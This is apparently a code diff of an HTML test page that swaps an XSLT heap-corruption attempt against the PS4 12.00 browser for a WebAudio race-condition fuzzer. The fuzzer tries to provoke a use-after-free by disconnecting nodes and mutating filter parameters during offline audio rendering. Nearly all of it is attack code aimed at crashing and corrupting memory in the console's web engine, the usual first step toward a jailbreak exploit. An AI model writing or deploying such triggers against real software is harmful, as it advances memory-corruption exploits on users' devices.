@@ -2,89 +2,96 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 12.00 XSLT Heap Corrupter</title>
+    <title>PS4 12.00 WebAudio Race (UAF)</title>
+    <style>
+        body { background-color: #0d0d0d; color: #ff3333; font-family: monospace; padding: 20px; }
+        button { font-size: 20px; padding: 15px; background: #333; color: white; border: 1px solid #ff3333; cursor: pointer; }
+        #status { margin-top: 20px; border: 1px solid #333; padding: 10px; }
+    </style>
 </head>
 <body>
-    <h1>XSLT Memory Corruption Test</h1>
-    <p>Target: libxslt/libxml2 internal bindings.</p>
+    <h1>WebAudio Race Condition Fuzzer</h1>
+    <p>Targeting: AudioRenderThread (High Severity)</p>
     
-    <button onclick="startXSLTAttack()">INICIAR ATAQUE XSLT</button>
-    <div id="status" class="log">Aguardando comando...</div>
+    <button onclick="startAudioRace()">INICIAR FUZZING DE ÁUDIO</button>
+    
+    <div id="status">Status: Aguardando...</div>
 
     <script>
         function log(msg) { document.getElementById('status').innerText = msg; }
 
-        function startXSLTAttack() {
-            log("Gerando payload XML/XSLT malicioso...");
+        function startAudioRace() {
+            log("Inicializando OfflineAudioContext...");
 
-            if (!window.XSLTProcessor) {
-                log("ERRO: XSLTProcessor não existe neste navegador (Mitigado?).");
-                return;
-            }
+            // Tenta rodar 50 tentativas de conflito
+            let attempts = 0;
+            const maxAttempts = 50;
 
-            setTimeout(() => {
+            function runCycle() {
+                attempts++;
+                if(attempts > maxAttempts) {
+                    log("Teste finalizado. O navegador sobreviveu (Sem UAF óbvio).");
+                    return;
+                }
+                
+                log(`Tentativa ${attempts}/${maxAttempts} - Criando Grafo de Áudio...`);
+
                 try {
-                    // 1. Criar um XML base simples
-                    const parser = new DOMParser();
-                    const xmlString = `<root>${"<node>data</node>".repeat(100)}</root>`;
-                    const xmlDoc = parser.parseFromString(xmlString, "text/xml");
+                    // 1. Cria um contexto offline (renderiza o áudio na memória, super rápido)
+                    // Isso estressa a CPU mais que o áudio normal
+                    const ctx = new OfflineAudioContext(1, 44100 * 0.1, 44100); // 0.1 segundos buffer
 
-                    // 2. Criar um XSLT "Maligno" (Recursão + Geração de Atributos Dinâmicos)
-                    // Isso tenta estressar o alocador de memória do libxml2
-                    const xslString = `
-                    <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
-                        <xsl:template match="/">
-                            <output>
-                                <xsl:apply-templates select="//node"/>
-                            </output>
-                        </xsl:template>
+                    // 2. Cria nós de processamento
+                    const osc = ctx.createOscillator();
+                    const filter = ctx.createBiquadFilter();
+                    const scriptNode = ctx.createScriptProcessor(4096, 1, 1);
 
-                        <xsl:template match="node">
-                            <xsl:element name="bomb">
-                                <xsl:attribute name="id">
-                                    <xsl:value-of select="concat('id_', position())"/>
-                                </xsl:attribute>
-                                <xsl:call-template name="stress">
-                                    <xsl:with-param name="depth" select="30"/>
-                                </xsl:call-template>
-                            </xsl:element>
-                        </xsl:template>
+                    // 3. Conecta tudo
+                    osc.connect(filter);
+                    filter.connect(scriptNode);
+                    scriptNode.connect(ctx.destination);
 
-                        <xsl:template name="stress">
-                            <xsl:param name="depth"/>
-                            <xsl:if test="$depth > 0">
-                                <xsl:variable name="payload" select="'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'"/>
-                                <data><xsl:value-of select="$payload"/></data>
-                                <xsl:call-template name="stress">
-                                    <xsl:with-param name="depth" select="$depth - 1"/>
-                                </xsl:call-template>
-                            </xsl:if>
-                        </xsl:template>
-                    </xsl:stylesheet>`;
+                    osc.start(0);
 
-                    const xslDoc = parser.parseFromString(xslString, "text/xml");
+                    // 4. O Ataque: Callback malicioso
+                    // Quando o processador pede áudio, nós tentamos destruir o filtro
+                    scriptNode.onaudioprocess = function(e) {
+                        // Tenta desconectar e modificar propriedades durante o processamento
+                        // Isso pode causar leitura de memória inválida na thread de áudio
+                        filter.disconnect();
+                        
+                        // Alocação de lixo para forçar o Garbage Collector
+                        let junk = new Float32Array(10000); 
+                        junk.fill(Math.random());
+                    };
 
-                    // 3. O Gatilho
-                    log("Executando transformToFragment (Isso deve travar o WebProcess)...");
-                    
-                    const processor = new XSLTProcessor();
-                    processor.importStylesheet(xslDoc);
-                    
-                    // Loop rápido para tentar Race Condition no processador
-                    for(let i=0; i<50; i++) {
-                        const fragment = processor.transformToFragment(xmlDoc, document);
-                        // Tenta acessar o fragmento imediatamente
-                        document.body.appendChild(fragment);
-                    }
+                    // 5. Inicia a renderização
+                    ctx.startRendering().then(() => {
+                        // Se completou sem crash, tenta de novo
+                        setTimeout(runCycle, 100);
+                    }).catch((err) => {
+                        // Erro normal de JS não é crash
+                        console.log(err);
+                        runCycle();
+                    });
 
-                    log("Sobreviveu. O libxslt parece estável.");
-                    
+                    // 6. Interferência Externa (Race Condition)
+                    // Tenta alterar parâmetros do filtro ENQUANTO ele está renderizando
+                    setTimeout(() => {
+                        try {
+                            filter.frequency.value = 1000;
+                            filter.Q.value = 20;
+                            // Se o objeto já foi liberado na thread de áudio, isso causa Panic
+                        } catch(e) {}
+                    }, 5); // Timing crítico
+
                 } catch (e) {
                     log("Erro JS: " + e.message);
                 }
-            }, 500);
+            }
+
+            runCycle();
         }
     </script>
 </body>
 </html>
-
